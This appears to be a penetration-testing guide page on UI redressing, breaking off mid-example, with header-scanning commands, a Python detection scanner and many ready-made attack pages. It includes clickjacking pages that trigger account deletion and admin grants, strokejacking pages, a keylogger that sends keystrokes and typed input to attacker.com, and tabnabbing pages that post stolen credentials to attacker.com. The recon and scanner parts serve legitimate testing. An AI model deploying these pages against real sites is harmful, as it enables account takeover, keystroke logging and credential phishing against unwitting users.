---
title: UI Redressing Attack
description: UI Redressing attacks covering all variants, detection, exploitation, advanced techniques, payload crafting, bypass methods, and tool usage.
navigation:
  icon: i-lucide-layers
  title: UI Redressing
---

## Overview

UI Redressing is a class of attacks that manipulates the visual presentation of web interfaces to trick users into performing unintended actions. The attacker overlays, repositions, obscures, or transforms UI elements so the victim interacts with hidden or disguised targets while believing they are interacting with legitimate visible content.

::note
UI Redressing is the umbrella term that encompasses Clickjacking, Likejacking, Cursorjacking, Strokejacking, Filejacking, Tabjacking, Pastejacking, Drag-and-Drop attacks, and other visual deception techniques. This guide covers the full spectrum beyond basic clickjacking.
::

### Attack Taxonomy

::card-group
  ::card
  ---
  title: Clickjacking
  icon: i-lucide-mouse-pointer-click
  ---
  Overlaying invisible iframes to hijack clicks on hidden targets beneath visible bait content.
  ::

  ::card
  ---
  title: Strokejacking
  icon: i-lucide-keyboard
  ---
  Capturing keystrokes intended for a visible input but redirecting them to a hidden input in an invisible iframe.
  ::

  ::card
  ---
  title: Tabnabbing / Tabjacking
  icon: i-lucide-app-window
  ---
  Silently replacing the content of an inactive browser tab with a phishing page to steal credentials when the user returns.
  ::

  ::card
  ---
  title: Pastejacking
  icon: i-lucide-clipboard-paste
  ---
  Manipulating clipboard content so when a user copies visible text, malicious commands are pasted instead.
  ::

  ::card
  ---
  title: Drag-and-Drop Redressing
  icon: i-lucide-move
  ---
  Tricking users into dragging content from or into hidden iframes, extracting tokens or injecting data.
  ::

  ::card
  ---
  title: Filejacking
  icon: i-lucide-file-up
  ---
  Manipulating file upload dialogs or download prompts through hidden overlaid elements.
  ::

  ::card
  ---
  title: Double Clickjacking
  icon: i-lucide-mouse-pointer-2
  ---
  Exploiting the timing gap between two rapid clicks to swap UI elements, making the second click hit a malicious target.
  ::

  ::card
  ---
  title: Popup / Permission Redressing
  icon: i-lucide-bell-ring
  ---
  Positioning browser permission dialogs (camera, microphone, location, notifications) under decoy UI to trick users into granting access.
  ::
::

### Impact Matrix

| Attack Type | Auth Bypass | Data Theft | Account Takeover | Malware Delivery | Permission Grant |
| --- | --- | --- | --- | --- | --- |
| Clickjacking | ✅ | ✅ | ✅ | ✅ | ✅ |
| Strokejacking | ✅ | ✅ | ✅ | ❌ | ❌ |
| Tabnabbing | ✅ | ✅ | ✅ | ✅ | ❌ |
| Pastejacking | ❌ | ❌ | ❌ | ✅ | ❌ |
| Drag-and-Drop | ❌ | ✅ | ✅ | ❌ | ❌ |
| Filejacking | ❌ | ❌ | ❌ | ✅ | ❌ |
| Double Click | ✅ | ✅ | ✅ | ❌ | ✅ |
| Permission Redress | ❌ | ✅ | ❌ | ❌ | ✅ |

---

## Reconnaissance & Detection

### Header & Policy Enumeration

::steps{level="4"}

#### Scan for Framing Protections

```bash [Header Enumeration]
# Single target comprehensive check
curl -sI "https://target.com" | grep -iE "x-frame-options|content-security-policy|permissions-policy|cross-origin|referrer-policy"

# Check multiple endpoints systematically
ENDPOINTS=(/ /login /register /settings /profile /dashboard /account /admin /oauth/authorize /api/consent /delete-account /change-password /change-email /transfer /payment /checkout)

for ep in "${ENDPOINTS[@]}"; do
  echo "=== https://target.com$ep ==="
  curl -sI "https://target.com$ep" 2>/dev/null | grep -iE "(x-frame-options|frame-ancestors|permissions-policy)" || echo "  [!] NO FRAMING PROTECTION"
  echo ""
done

# Check authenticated vs unauthenticated
curl -sI "https://target.com/dashboard" | grep -i "x-frame"
curl -sI "https://target.com/dashboard" -H "Cookie: session=VALID_SESSION" | grep -i "x-frame"

# Mobile user-agent (may have different policies)
curl -sI -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15" "https://target.com" | grep -iE "x-frame|frame-ancestors"

# Check all response headers for security context
curl -sI "https://target.com" | grep -iE "^(x-frame|content-security|cross-origin-opener|cross-origin-embedder|cross-origin-resource|permissions-policy|referrer-policy|strict-transport|x-content-type|x-xss)"
```

#### Analyze CSP Granularly

```bash [CSP Deep Analysis]
# Extract full CSP header
curl -sI "https://target.com" | grep -i "content-security-policy" | sed 's/; /;\n/g'

# Check frame-ancestors specifically
curl -sI "https://target.com" | grep -oi "frame-ancestors[^;]*"

# Check if frame-src or child-src restrict outgoing frames
curl -sI "https://target.com" | grep -oi "frame-src[^;]*"
curl -sI "https://target.com" | grep -oi "child-src[^;]*"

# Look for CSP report-only (not enforced)
curl -sI "https://target.com" | grep -i "content-security-policy-report-only"
# Report-only CSP does NOT prevent framing - still exploitable

# Check meta tag CSP (frame-ancestors in meta tags is IGNORED by browsers)
curl -s "https://target.com" | grep -i "content-security-policy" | grep -i "meta"
# If CSP is only in meta tag with frame-ancestors, it's NOT enforced
```

#### Check Cookie Security Attributes

```bash [Cookie Analysis]
# Get all Set-Cookie headers
curl -sI "https://target.com/login" | grep -i "set-cookie"

# Check SameSite attribute
curl -sI "https://target.com/login" | grep -i "set-cookie" | grep -ioE "samesite=[a-z]+"

# Check all cookie flags
curl -sI "https://target.com/login" | grep -i "set-cookie" | while read line; do
  echo "Cookie: $line"
  echo "$line" | grep -qi "samesite=strict" && echo "  SameSite=Strict (blocks cross-site iframe)" || true
  echo "$line" | grep -qi "samesite=lax" && echo "  SameSite=Lax (blocks POST in iframe)" || true
  echo "$line" | grep -qi "samesite=none" && echo "  SameSite=None (allows cross-site iframe)" || true
  echo "$line" | grep -qi "httponly" && echo "  HttpOnly" || true
  echo "$line" | grep -qi "secure" && echo "  Secure" || true
  echo ""
done

# SameSite impact on UI Redressing:
# Strict → Most iframe-based attacks fail (cookies not sent)
# Lax    → GET-based actions work, POST-based fail
# None   → All attacks work (cookies sent in all contexts)
# Not set → Browser default (Lax in Chrome 80+)
```

#### Enumerate JavaScript Frame Busting

```bash [Frame Buster Detection]
# Download and search for frame-busting code
curl -s "https://target.com" | grep -iE "(top\.location|self\.location|parent\.location|window\.top|frameElement|top !==|top !=|self !==|self !=|inIframe|framekiller|bustframe)"

# Common frame-busting patterns to look for:
# if (top !== self) top.location = self.location
# if (window.top !== window.self) document.location = window.top.location
# if (parent.frames.length > 0) top.location.replace(document.location)
# if (window.frameElement) window.top.location = window.location
# window.addEventListener('DOMContentLoaded', function(){ if(top!=self) top.location=self.location })

# Check all inline and external scripts
curl -s "https://target.com" | grep -oE 'src="[^"]*\.js[^"]*"' | sort -u
# Download each JS file and search for frame-busting
```

::

### Automated Scanning

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Nuclei & Tools"}

  ```bash [Automated Detection]
  # Nuclei clickjacking templates
  nuclei -u "https://target.com" -tags clickjacking -severity info,low,medium,high
  nuclei -l urls.txt -tags clickjacking -o clickjack_results.txt

  # Custom nuclei template for comprehensive check
  cat << 'EOF' > ui-redressing-check.yaml
  id: ui-redressing-comprehensive
  info:
    name: UI Redressing Vulnerability Check
    severity: medium
    tags: clickjacking,ui-redressing
  http:
    - method: GET
      path:
        - "{{BaseURL}}"
        - "{{BaseURL}}/login"
        - "{{BaseURL}}/settings"
        - "{{BaseURL}}/profile"
      matchers-condition: and
      matchers:
        - type: status
          status:
            - 200
        - type: word
          words:
            - "X-Frame-Options"
            - "frame-ancestors"
          part: header
          negative: true
          condition: and
  EOF

  nuclei -u "https://target.com" -t ui-redressing-check.yaml

  # Eyewitness for visual confirmation
  eyewitness --web -f urls.txt --no-prompt -d eyewitness_output

  # httpx header check at scale
  cat domains.txt | httpx -silent -title -status-code -include-response-header \
    | grep -viE "x-frame-options|frame-ancestors" \
    | tee frameable.txt
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Scanner"}

  ```python [ui_redress_scanner.py]
  #!/usr/bin/env python3
  """
  UI Redressing Vulnerability Scanner
  Checks for all frame protection mechanisms
  """
  import requests
  import sys
  import re
  import json
  from urllib.parse import urlparse

  class UIRedressScanner:
      def __init__(self, timeout=10):
          self.timeout = timeout
          self.session = requests.Session()
          self.session.headers.update({
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          })

      def scan(self, url):
          results = {
              "url": url,
              "vulnerable": False,
              "protections": [],
              "weaknesses": [],
              "cookies": []
          }

          try:
              r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
              headers = {k.lower(): v for k, v in r.headers.items()}

              # Check X-Frame-Options
              xfo = headers.get("x-frame-options", "").upper().strip()
              if xfo:
                  if xfo in ["DENY", "SAMEORIGIN"]:
                      results["protections"].append(f"X-Frame-Options: {xfo}")
                  elif "ALLOW-FROM" in xfo:
                      results["weaknesses"].append(
                          f"X-Frame-Options: {xfo} (ALLOW-FROM deprecated, ignored by modern browsers)"
                      )
                  else:
                      results["weaknesses"].append(f"X-Frame-Options: {xfo} (unknown value)")
              else:
                  results["weaknesses"].append("Missing X-Frame-Options header")

              # Check CSP frame-ancestors
              csp = headers.get("content-security-policy", "")
              csp_ro = headers.get("content-security-policy-report-only", "")

              fa_match = re.search(r"frame-ancestors\s+([^;]+)", csp)
              if fa_match:
                  fa_val = fa_match.group(1).strip()
                  if fa_val in ["'none'", "'self'"]:
                      results["protections"].append(f"CSP frame-ancestors: {fa_val}")
                  elif fa_val == "*":
                      results["weaknesses"].append("CSP frame-ancestors: * (allows all)")
                  else:
                      results["protections"].append(f"CSP frame-ancestors: {fa_val}")
                      if "*." in fa_val:
                          results["weaknesses"].append(
                              f"CSP frame-ancestors allows wildcard subdomains: {fa_val}"
                          )
              else:
                  results["weaknesses"].append("Missing CSP frame-ancestors directive")

              if csp_ro and "frame-ancestors" in csp_ro:
                  results["weaknesses"].append(
                      "frame-ancestors in Report-Only CSP (NOT enforced)"
                  )

              # Check meta tag CSP (frame-ancestors ignored in meta)
              if "<meta" in r.text.lower() and "frame-ancestors" in r.text.lower():
                  results["weaknesses"].append(
                      "frame-ancestors found in meta tag (browsers IGNORE this)"
                  )

              # Check cookies
              for cookie_header in r.headers.get("set-cookie", "").split(","):
                  cookie_info = {"raw": cookie_header.strip()}
                  ss = re.search(r"samesite=(\w+)", cookie_header, re.I)
                  cookie_info["samesite"] = ss.group(1) if ss else "Not Set (defaults to Lax)"
                  cookie_info["httponly"] = "httponly" in cookie_header.lower()
                  cookie_info["secure"] = "secure" in cookie_header.lower()
                  results["cookies"].append(cookie_info)

              # Check JS frame busting
              fb_patterns = [
                  r"top\s*[!=]==?\s*self",
                  r"top\.location\s*=",
                  r"parent\.frames\.length",
                  r"window\.frameElement",
                  r"framekiller|bustframe|framebusting",
              ]
              has_js_bust = any(re.search(p, r.text, re.I) for p in fb_patterns)
              if has_js_bust:
                  results["weaknesses"].append(
                      "JavaScript frame-busting detected (bypassable with sandbox attribute)"
                  )

              # Check Cross-Origin headers
              coop = headers.get("cross-origin-opener-policy", "")
              coep = headers.get("cross-origin-embedder-policy", "")
              if coop:
                  results["protections"].append(f"COOP: {coop}")
              if coep:
                  results["protections"].append(f"COEP: {coep}")

              # Determine vulnerability
              has_xfo = bool(xfo) and xfo in ["DENY", "SAMEORIGIN"]
              has_csp_fa = bool(fa_match) and fa_match.group(1).strip() in ["'none'", "'self'"]
              results["vulnerable"] = not (has_xfo or has_csp_fa)

          except Exception as e:
              results["error"] = str(e)

          return results

      def print_results(self, results):
          status = "VULNERABLE" if results.get("vulnerable") else "PROTECTED"
          color = "\033[91m" if results["vulnerable"] else "\033[92m"
          reset = "\033[0m"

          print(f"\n{color}[{status}]{reset} {results['url']}")

          if results.get("protections"):
              print("  Protections:")
              for p in results["protections"]:
                  print(f"    ✅ {p}")

          if results.get("weaknesses"):
              print("  Weaknesses:")
              for w in results["weaknesses"]:
                  print(f"    ⚠️  {w}")

          if results.get("cookies"):
              print("  Cookies:")
              for c in results["cookies"]:
                  print(f"    🍪 SameSite={c['samesite']}, HttpOnly={c['httponly']}, Secure={c['secure']}")

  if __name__ == "__main__":
      scanner = UIRedressScanner()
      if len(sys.argv) < 2:
          print(f"Usage: {sys.argv[0]} <url|file>")
          sys.exit(1)

      target = sys.argv[1]
      if target.startswith("http"):
          results = scanner.scan(target)
          scanner.print_results(results)
      else:
          with open(target) as f:
              for line in f:
                  url = line.strip()
                  if url:
                      results = scanner.scan(url)
                      scanner.print_results(results)
  ```

  :::
::

---

## Clickjacking (Classic UI Redressing)

### Basic Overlay Attack

```html [classic_clickjack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPhone!</title>
    <style>
        body {
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .bait {
            text-align: center;
            position: relative;
        }
        .bait h1 { font-size: 32px; margin-bottom: 10px; }
        .bait p { color: #8b949e; margin-bottom: 30px; }
        .bait-btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 22px;
            border-radius: 10px;
            cursor: pointer;
        }
        /* Invisible iframe overlay */
        .target-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;           /* 0 for real attack, 0.3 for demo */
            z-index: 10;
            border: none;
        }
    </style>
</head>
<body>
    <div class="bait">
        <h1>🎉 Congratulations!</h1>
        <p>You've been selected for a special reward</p>
        <div style="position:relative; display:inline-block;">
            <button class="bait-btn">Claim Your Prize</button>
            <!-- Target action hidden over the button -->
            <iframe class="target-frame"
                src="https://target.com/settings/delete-account?confirm=yes"
                scrolling="no">
            </iframe>
        </div>
    </div>
</body>
</html>
```

### Multi-Step Clickjacking

When the target action requires multiple clicks (confirmation dialogs, multi-step forms), chain the clicks using timed iframe repositioning.

```html [multistep_clickjack.html]
<!DOCTYPE html>
<html>
<head>
    <title>Online Quiz - Win $100</title>
    <style>
        body {
            background: #1a1a2e;
            color: white;
            font-family: 'Segoe UI', sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .quiz {
            background: #16213e;
            padding: 40px;
            border-radius: 12px;
            width: 500px;
            text-align: center;
            position: relative;
        }
        .question { display: none; }
        .question.active { display: block; }
        .quiz-btn {
            background: #0f3460;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px;
        }
        .quiz-btn:hover { background: #1a4a7a; }
        .progress-bar {
            height: 4px;
            background: #0a0a23;
            border-radius: 2px;
            margin-bottom: 30px;
        }
        .progress-fill {
            height: 100%;
            background: #e94560;
            border-radius: 2px;
            transition: width 0.5s ease;
        }
        .overlay-frame {
            position: absolute;
            opacity: 0;
            z-index: 100;
            border: none;
            pointer-events: auto;
        }
    </style>
</head>
<body>
    <div class="quiz" id="quiz">
        <div class="progress-bar">
            <div class="progress-fill" id="progress" style="width:25%"></div>
        </div>

        <!-- Step 1: Click lines up with target's first button -->
        <div class="question active" id="q1">
            <h2>Question 1 of 4</h2>
            <p>What year was the internet invented?</p>
            <button class="quiz-btn" onclick="nextQ(2)">1969</button>
            <button class="quiz-btn" onclick="nextQ(2)">1983</button>
        </div>

        <!-- Step 2: Click lines up with target's confirmation -->
        <div class="question" id="q2">
            <h2>Question 2 of 4</h2>
            <p>Which company created JavaScript?</p>
            <button class="quiz-btn" onclick="nextQ(3)">Netscape</button>
            <button class="quiz-btn" onclick="nextQ(3)">Microsoft</button>
        </div>

        <!-- Step 3: Click lines up with target's "Yes, I'm sure" -->
        <div class="question" id="q3">
            <h2>Question 3 of 4</h2>
            <p>What does HTML stand for?</p>
            <button class="quiz-btn" onclick="nextQ(4)">HyperText Markup Language</button>
        </div>

        <!-- Step 4: Final confirm click -->
        <div class="question" id="q4">
            <h2>🎉 You Won!</h2>
            <p>Click below to claim your $100 prize!</p>
            <button class="quiz-btn" onclick="alert('Action completed!')">Claim $100</button>
        </div>

        <!-- Hidden iframe repositioned for each step -->
        <iframe class="overlay-frame" id="targetFrame"
            src="https://target.com/account/delete"
            width="500" height="400">
        </iframe>
    </div>

    <script>
        const frame = document.getElementById('targetFrame');
        const positions = [
            // [top, left, width, height] for each step
            // Position iframe so target's button aligns with quiz button
            { top: '180px', left: '50px',  width: '200px', height: '60px' },
            { top: '180px', left: '50px',  width: '200px', height: '60px' },
            { top: '180px', left: '130px', width: '250px', height: '60px' },
            { top: '200px', left: '150px', width: '200px', height: '60px' }
        ];

        function nextQ(step) {
            document.querySelectorAll('.question').forEach(q => q.classList.remove('active'));
            document.getElementById('q' + step).classList.add('active');
            document.getElementById('progress').style.width = (step * 25) + '%';

            // Reposition iframe for next click target
            const pos = positions[step - 1];
            if (pos) {
                Object.assign(frame.style, pos);
            }
        }

        // Initial positioning
        Object.assign(frame.style, positions[0]);
    </script>
</body>
</html>
```

### Pixel-Perfect Alignment

```html [pixel_perfect.html]
<!DOCTYPE html>
<html>
<head>
    <title>Verify Account</title>
    <style>
        body {
            margin: 0;
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .wrapper {
            position: relative;
            width: 100vw;
            height: 100vh;
        }
        /*
         * Technique: Use negative positioning and clipping to show
         * only the exact button from the target page.
         * The user sees only the target button styled as our own.
         */
        .target-frame {
            position: absolute;
            border: none;
            /* Load full page but offset to show only the button */
            width: 1200px;
            height: 800px;
            /* Move iframe so button appears at desired position */
            top: -340px;    /* Adjust based on target button position */
            left: -520px;   /* Adjust based on target button position */
            opacity: 0.0001;
            z-index: 10;
            /* Clip to show only the button area */
            clip-path: inset(340px 0 0 520px);
            /* Alternative: clip property */
            /* clip: rect(340px, 720px, 390px, 520px); */
        }
        .bait-content {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            padding: 50px;
        }
        .bait-button {
            position: absolute;
            top: 0;
            left: 0;
            background: #238636;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="bait-content">
            <h1>Account Verification</h1>
            <p>Click the button to verify your identity</p>
            <button class="bait-button">Verify Now</button>
        </div>
        <iframe class="target-frame"
            src="https://target.com/admin/grant-access?user=attacker&role=admin">
        </iframe>
    </div>
</body>
</html>
```

---

## Strokejacking (Keystroke Hijacking)

### Concept

Strokejacking captures keystrokes the user types into a visible input field but silently redirects them to a hidden input inside an invisible iframe. The victim believes they are typing in a search box, but their keystrokes are actually entering data into a hidden form on the target site.

### Basic Strokejacking PoC

```html [strokejack_basic.html]
<!DOCTYPE html>
<html>
<head>
    <title>Search Engine</title>
    <style>
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .search-container {
            text-align: center;
            width: 600px;
            position: relative;
        }
        .search-container h1 { margin-bottom: 30px; }
        /* Visible input - user sees this */
        .visible-input {
            width: 100%;
            padding: 18px 20px;
            font-size: 18px;
            border: 2px solid #30363d;
            border-radius: 10px;
            background: #161b22;
            color: #c9d1d9;
            outline: none;
            position: relative;
            z-index: 1;
        }
        .visible-input:focus {
            border-color: #1f6feb;
        }
        /*
         * Hidden iframe containing target's input field.
         * Positioned exactly over the visible input.
         * Opacity near-zero so keystrokes go to iframe's input.
         */
        .hidden-target {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 5;
            border: none;
        }
        .input-wrapper {
            position: relative;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="search-container">
        <h1>🔍 Quick Search</h1>
        <p style="color:#8b949e; margin-bottom:20px;">Type your search query below</p>
        <div class="input-wrapper">
            <input class="visible-input" type="text" placeholder="Search anything..."
                   autocomplete="off" readonly>
            <!--
                Target iframe: loads a page with an input field.
                The iframe's input receives the actual keystrokes.
                Example: target's "change email" field
            -->
            <iframe class="hidden-target"
                src="https://target.com/settings/change-email"
                scrolling="no">
            </iframe>
        </div>
    </div>

    <script>
        // Mirror keystrokes to visible input for visual feedback
        const visibleInput = document.querySelector('.visible-input');
        document.addEventListener('keydown', function(e) {
            if (e.key.length === 1) {
                visibleInput.value += e.key;
            } else if (e.key === 'Backspace') {
                visibleInput.value = visibleInput.value.slice(0, -1);
            }
        });
    </script>
</body>
</html>
```

### Advanced Strokejacking with Focus Stealing

```html [strokejack_advanced.html]
<!DOCTYPE html>
<html>
<head>
    <title>Login Portal</title>
    <style>
        body {
            background: #0f0f23;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-form {
            background: #1a1a3e;
            padding: 40px;
            border-radius: 12px;
            width: 400px;
            position: relative;
        }
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #aaa;
            font-size: 14px;
        }
        .form-input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #333;
            border-radius: 6px;
            background: #252550;
            color: white;
            outline: none;
            box-sizing: border-box;
        }
        .form-input:focus { border-color: #667eea; }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        /*
         * Invisible iframe containing target's password change form.
         * Keystrokes typed in "New Password" go to target's
         * password field instead.
         */
        .keystroke-capture {
            position: absolute;
            opacity: 0.0001;
            z-index: 50;
            border: none;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h2 style="margin-bottom:30px; text-align:center;">🔐 Secure Login</h2>

        <div class="form-group">
            <label>Username</label>
            <input class="form-input" type="text" placeholder="Enter username">
        </div>

        <div class="form-group">
            <label>Password</label>
            <div style="position:relative;">
                <input class="form-input" type="password" placeholder="Enter password"
                       id="visiblePassword">
                <!--
                    Hidden iframe positioned over password field.
                    User types password, it goes to target's
                    "new password" field on their change-password page.
                -->
                <iframe class="keystroke-capture"
                    src="https://target.com/change-password"
                    style="top:0; left:0; width:100%; height:100%;"
                    scrolling="no">
                </iframe>
            </div>
        </div>

        <button class="submit-btn">Log In</button>
    </div>

    <script>
        // Visual feedback: show dots in visible password field
        document.addEventListener('keypress', function(e) {
            const pwField = document.getElementById('visiblePassword');
            if (document.activeElement !== pwField) return;
            // Keystrokes actually go to iframe, but we show feedback
            setTimeout(() => {
                pwField.value += '•';
            }, 10);
        });
    </script>
</body>
</html>
```

### Strokejacking with Input Exfiltration

```html [strokejack_exfil.html]
<!DOCTYPE html>
<html>
<head>
    <title>Newsletter Signup</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .signup-box {
            background: #1e1e1e;
            padding: 40px;
            border-radius: 10px;
            width: 450px;
            text-align: center;
        }
        .email-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #333;
            border-radius: 6px;
            background: #2a2a2a;
            color: white;
            margin: 20px 0;
            box-sizing: border-box;
        }
        .signup-btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="signup-box">
        <h2>📧 Get Updates</h2>
        <p style="color:#888;">Enter your email for exclusive content</p>
        <input class="email-input" type="email" id="emailField"
               placeholder="your@email.com">
        <button class="signup-btn" onclick="captureInput()">Subscribe</button>
    </div>

    <script>
        // Capture everything typed and exfiltrate
        let captured = '';

        document.getElementById('emailField').addEventListener('input', function(e) {
            captured = this.value;
        });

        // Also capture via keylogger approach
        document.addEventListener('keydown', function(e) {
            if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter') {
                // Send captured keystroke to attacker server
                const img = new Image();
                img.src = 'https://attacker.com/log?key=' +
                    encodeURIComponent(e.key) + '&ts=' + Date.now();
            }
        });

        function captureInput() {
            // Exfiltrate the full input
            fetch('https://attacker.com/capture', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    email: captured,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                })
            });
            alert('Thanks for subscribing!');
        }
    </script>
</body>
</html>
```

---

## Tabnabbing / Tabjacking

### Concept

Tabnabbing exploits user trust in already-opened browser tabs. When a user clicks a link that opens a new tab (or navigates away), the original page silently changes its content to a phishing page. When the user returns to the original tab, they see a fake login page and enter credentials.

### Basic Tabnabbing

```html [tabnabbing_basic.html]
<!DOCTYPE html>
<html>
<head>
    <title>Interesting Article</title>
    <style>
        body {
            background: #f5f5f5;
            font-family: Georgia, serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 40px;
            color: #333;
        }
        a { color: #1a73e8; }
        .article { line-height: 1.8; }
    </style>
</head>
<body>
    <article class="article">
        <h1>Top 10 Tech Trends in 2025</h1>
        <p>Read more about these amazing technologies...</p>
        <p>
            For detailed analysis, check out this
            <a href="https://legitimate-site.com/article"
               target="_blank"
               id="externalLink">
                comprehensive report
            </a>.
        </p>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.
        Pellentesque auctor nisi eu viverra tincidunt...</p>
    </article>

    <script>
        document.getElementById('externalLink').addEventListener('click', function() {
            // When user clicks the link and switches to new tab,
            // silently replace this page with a phishing page
            setTimeout(function() {
                // Change the entire page to look like a login form
                document.title = "Session Expired - Login Required";

                document.body.innerHTML = `
                    <div style="
                        max-width: 400px;
                        margin: 100px auto;
                        padding: 40px;
                        background: white;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        font-family: Arial, sans-serif;
                    ">
                        <div style="text-align:center; margin-bottom:30px;">
                            <img src="https://target.com/logo.png"
                                 style="height:40px;" alt="Logo">
                        </div>
                        <h2 style="text-align:center; color:#333; margin-bottom:10px;">
                            Session Expired
                        </h2>
                        <p style="text-align:center; color:#666; margin-bottom:30px;">
                            Please log in again to continue
                        </p>
                        <form action="https://attacker.com/phish" method="POST">
                            <div style="margin-bottom:15px;">
                                <label style="display:block; margin-bottom:5px; color:#555;">
                                    Email
                                </label>
                                <input type="email" name="email"
                                    style="width:100%; padding:12px; border:1px solid #ddd;
                                           border-radius:4px; font-size:14px; box-sizing:border-box;">
                            </div>
                            <div style="margin-bottom:20px;">
                                <label style="display:block; margin-bottom:5px; color:#555;">
                                    Password
                                </label>
                                <input type="password" name="password"
                                    style="width:100%; padding:12px; border:1px solid #ddd;
                                           border-radius:4px; font-size:14px; box-sizing:border-box;">
                            </div>
                            <button type="submit"
                                style="width:100%; padding:12px; background:#1a73e8;
                                       color:white; border:none; border-radius:4px;
                                       font-size:16px; cursor:pointer;">
                                Log In
                            </button>
                        </form>
                    </div>
                `;

                // Also change the favicon
                var link = document.createElement('link');
                link.rel = 'icon';
                link.href = 'https://target.com/favicon.ico';
                document.head.appendChild(link);

                // Change URL if possible (history API)
                if (history.replaceState) {
                    history.replaceState(null, '', '/login');
                }

            }, 3000); // Wait 3 seconds after user leaves tab
        });
    </script>
</body>
</html>
```

### Reverse Tabnabbing via target=_blank

::caution
Links with `target="_blank"` without `rel="noopener noreferrer"` allow the opened page to access `window.opener` and redirect the original tab.
::

```html [reverse_tabnab_vulnerable.html]
<!-- VULNERABLE: Link opens new tab without noopener -->
<a href="https://attacker.com/article" target="_blank">
    Read this article
</a>
<!--
    The attacker page at attacker.com/article can now do:
    window.opener.location = "https://attacker.com/phishing-page"
    This silently redirects the ORIGINAL tab to a phishing page.
-->
```

```html [attacker_page.html]
<!-- attacker.com/article - the page opened in new tab -->
<!DOCTYPE html>
<html>
<head>
    <title>Interesting Article</title>
</head>
<body>
    <h1>Welcome to our article!</h1>
    <p>This is a legitimate-looking article page...</p>

    <script>
        // Check if we have access to opener window
        if (window.opener) {
            // Redirect the original tab to a phishing page
            window.opener.location = 'https://attacker.com/phish/target-login.html';
        }
    </script>
</body>
</html>
```

### Reverse Tabnabbing Scanner

```bash [Scan for Vulnerable Links]
# Find links with target=_blank without noopener
curl -s "https://target.com" | grep -oP '<a[^>]*target\s*=\s*["\x27]_blank["\x27][^>]*>' | grep -v "noopener"

# Check entire site
wget -q -O - "https://target.com" | grep -oiE '<a[^>]+target="_blank"[^>]*>' | grep -viE 'noopener|noreferrer'

# Python scanner for reverse tabnabbing
python3 << 'PYEOF'
import requests
import re
import sys
from urllib.parse import urljoin

url = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
r = requests.get(url)
links = re.findall(r'<a[^>]*target\s*=\s*["\x27]_blank["\x27][^>]*>', r.text, re.I)

for link in links:
    if 'noopener' not in link.lower() and 'noreferrer' not in link.lower():
        href = re.search(r'href\s*=\s*["\x27]([^"\x27]+)', link)
        href_val = href.group(1) if href else "unknown"
        print(f"[VULN] {href_val}")
        print(f"  Tag: {link}")
        print()
PYEOF
```

### Visibility API Tabnabbing

```html [visibility_tabnab.html]
<!DOCTYPE html>
<html>
<head>
    <title>News Portal</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 40px; background: #fafafa; }
    </style>
</head>
<body>
    <h1>Breaking News</h1>
    <p>Latest updates from around the world...</p>

    <script>
        // Use Page Visibility API to detect when user leaves the tab
        let replaced = false;

        document.addEventListener('visibilitychange', function() {
            if (document.hidden && !replaced) {
                replaced = true;

                // Delay to ensure user has fully switched tabs
                setTimeout(function() {
                    // Replace page content with phishing form
                    document.title = "Login - Your Account";
                    document.body.innerHTML = `
                        <div style="max-width:400px; margin:80px auto; padding:30px;
                                    background:white; border-radius:8px;
                                    box-shadow:0 1px 5px rgba(0,0,0,0.1);">
                            <h2>Your session has expired</h2>
                            <p>Please enter your credentials to continue.</p>
                            <form action="https://attacker.com/collect" method="POST">
                                <input type="email" name="email" placeholder="Email"
                                    style="width:100%;padding:10px;margin:10px 0;
                                           border:1px solid #ccc;border-radius:4px;
                                           box-sizing:border-box;">
                                <input type="password" name="password" placeholder="Password"
